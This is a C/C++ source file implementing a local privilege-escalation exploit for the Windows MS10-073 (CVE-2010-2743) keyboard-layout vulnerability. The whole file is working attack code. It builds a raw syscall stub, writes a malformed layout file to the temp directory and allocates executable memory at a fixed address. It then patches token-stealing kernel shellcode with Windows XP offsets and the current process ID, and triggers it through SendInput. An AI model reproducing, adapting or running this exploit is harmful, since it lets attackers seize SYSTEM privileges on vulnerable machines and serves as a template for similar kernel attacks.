#include <string>
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>

#define MAGIC_OFFSET 0x6261
#define InitializeUnicodeStr(p,s) {     \
	(p)->Length= wcslen(s)*2;           \
	(p)->MaximumLength = wcslen(s)*2+2; \
	(p)->Buffer = s;                \
}
_declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx
(
	IN HANDLE Handle,
	IN DWORD offTable,
	IN PUNICODE_STRING puszKeyboardName,
	IN HKL hKL,
	IN PUNICODE_STRING puszKLID,
	IN DWORD dwKLID,
	IN UINT Flags
)
{
	__asm
	{
		mov eax, 000011c6h
		mov edx, 7ffe0300h
		call dword ptr[edx]
		retn 1Ch
	}
}

unsigned char shellcode[] = 
"\x60\x64\xa1\x24\x01\x00\x00\x8b\x70\x44\x89\xf0\xbb\x00\x00\x00"
"\x00\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\x8b\x04\x18\x29\xd8"
"\x39\x14\x08\x75\xf6\xbb\x00\x00\x00\x00\x8b\x3c\x18\x83\xe7\xf8"
"\x89\xf0\xbb\x00\x00\x00\x00\xb9\x00\x00\x00\x00\xba\x00\x00\x00"
"\x00\x8b\x04\x18\x29\xd8\x39\x14\x08\x75\xf6\xbb\x00\x00\x00\x00"
"\x89\x3c\x18\x61\xc2\x0c\00";

unsigned char fakeDll[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xE0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x2E\x64\x61\x74\x61\x00\x00\x00"
"\xE6\x00\x00\x00\x60\x01\x00\x00\xE6\x00\x00\x00\x60\x01\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x94\x01\x00\x00\x9E\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"//crash??
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xA6\x01\x00\x00\xAA\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x9C\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x01\x00\x00\x00\xC2\x01\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"//index
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00";

DWORD WINAPI exp_ms10_073(LPVOID lpParam)
{
	bool *isXp = static_cast<bool*>(lpParam);

	UNICODE_STRING  uStr;
	UNICODE_STRING uKerbordname;
	KEYBDINPUT      kb = { 0 };
	INPUT           vInput = { 0 };

	HANDLE          hFile;
	DWORD           dwFuckS0ny;

	HKL             hKbd;

	WCHAR           lpPath[MAX_PATH] = { 0 };
	WCHAR           lpLayoutFile[MAX_PATH] = { 0 };

	LPVOID          lpShellPtr;

	printf("\n\nMS10-073/CVE-2010-2743 Exploit\n");
	LoadLibraryA("user32.dll");
	InitializeUnicodeStr(&uStr, (PWSTR)L"pwn3d.dll");
	//fix by instruder
	InitializeUnicodeStr(&uKerbordname, (PWSTR)L"A");
	uKerbordname.MaximumLength = 0;
	GetTempPathW(MAX_PATH, lpPath);
	wsprintf(lpLayoutFile, L"%lSp0wns.boom111", lpPath);
	hFile = CreateFileW(lpLayoutFile,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0,
		CREATE_ALWAYS,
		0, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf(" \n[!!] Error\n");
		return false;
	}

	WriteFile(hFile,
		fakeDll,
		sizeof(fakeDll) - 1,
		&dwFuckS0ny,
		NULL);
	printf("\n[+] Writing malformed kbd layout file \n\t\"%S\"\n\t[ %d ] bytes written\n", lpLayoutFile, dwFuckS0ny);
	CloseHandle(hFile);

	hFile = CreateFileW(lpLayoutFile,
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		0, 0);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf(" \n[!!] Error\n");
		return false;
	}
	//hKbd = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), &dwFuckS0ny));
	hKbd = GetKeyboardLayout(GetCurrentThreadId());
	NtUserLoadKeyboardLayoutEx(hFile, 0x01AE0160, &uKerbordname, hKbd, &uStr, 0x666, 0x101);
	lpShellPtr = VirtualAlloc((LPVOID)0x60630000,
		0xF000,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	printf("\n[+] Allocating memory...");

	if (!lpShellPtr)
	{
		printf("[!!] Error %x\n", GetLastError());
		return false;
	}
	else {
		printf("[ OK ]\n");
	}

	memset(lpShellPtr, 0x90, 0xF000);

	//Prepare the shellcode (replace platform specific stuff, and pid)
	DWORD pid=GetCurrentProcessId();
	printf("Current pid is : %d", pid);
	if (*isXp)
	{
		// 仅支持32位系统
		// 修复flink_off	=0x88
		shellcode[0x0d] = 0x88;
		shellcode[0x0e] = 0;
		shellcode[0x0f] = 0;
		shellcode[0x10] = 0;
		shellcode[0x33] = 0x88;
		shellcode[0x34] = 0;
		shellcode[0x35] = 0;
		shellcode[0x36] = 0;
		// 修复pid_off		=0x84
		shellcode[0x12] = 0x84;
		shellcode[0x13] = 0;
		shellcode[0x14] = 0;
		shellcode[0x15] = 0;
		shellcode[0x38] = 0x84;
		shellcode[0x39] = 0;
		shellcode[0x3a] = 0;
		shellcode[0x3b] = 0;
		// 修复system_pid	=0x04
		shellcode[0x17] = 0x04;
		shellcode[0x18] = 0;
		shellcode[0x19] = 0;
		shellcode[0x1A] = 0;
		// 修复token_off	=0xc8
		shellcode[0x26] = 0xc8;
		shellcode[0x27] = 0;
		shellcode[0x28] = 0;
		shellcode[0x29] = 0;
		shellcode[0x4c] = 0xc8;
		shellcode[0x4d] = 0;
		shellcode[0x4e] = 0;
		shellcode[0x4f] = 0;
		//修复PID
		memcpy(shellcode + 0x3d, &pid, 4);
	}
	else //win2000
	{
		// 仅支持32位系统
		// 修复flink_off	=0xa0
		// 修复pid_off		=0x9c
		// 修复system_pid	=0x8
		// 修复token_off	=0x12c
	}

	memcpy((void*)((ULONG_PTR)lpShellPtr + MAGIC_OFFSET),
		(const void*)shellcode,
		sizeof(shellcode) - 1);

	kb.wVk = 0x0;
	vInput.type = INPUT_KEYBOARD;
	vInput.ki = kb;

	printf("\n[+] Triggering shellcode...");
	SendInput(1, (LPINPUT)&vInput, sizeof(INPUT));
	printf("\n[+] Done\n");
	return true;
}